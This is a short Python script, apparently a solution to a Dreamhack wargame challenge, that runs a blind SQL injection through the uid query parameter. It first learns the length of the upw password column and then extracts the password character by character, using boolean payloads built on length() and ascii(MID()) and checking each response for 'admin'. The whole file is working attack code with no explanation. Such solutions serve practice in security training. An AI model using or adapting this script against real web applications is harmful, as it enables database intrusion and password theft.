import requests
from urllib import parse
import string

HOST = "http://host3.dreamhack.games:10194/?uid={}"

get_length_payload = "'||length(upw)={}#"

pw_len = 0

for i in range(1, 50):
	length_payload = get_length_payload.format(i)
	payload = HOST.format(parse.quote(length_payload))
	res = requests.get(payload)
	print(f"{i}\r", end="")
	if 'admin' in res.text:
		pw_len = i
		break
print()
pw = ""
pw_leak_payload = "'||ascii(MID(upw,{},1))={}#"

for i in range(1, pw_len+1, 1):
	for c in string.printable: 
		pw_payload = pw_leak_payload.format(i, ord(c))
		payload = HOST.format(parse.quote(pw_payload))
		res = requests.get(payload)
		print(f"{i}, {c}\r", end="")
		if 'admin' in res.text:
			pw += c
			print("-"*30)
			print(pw)
			print("-"*30)
			break	
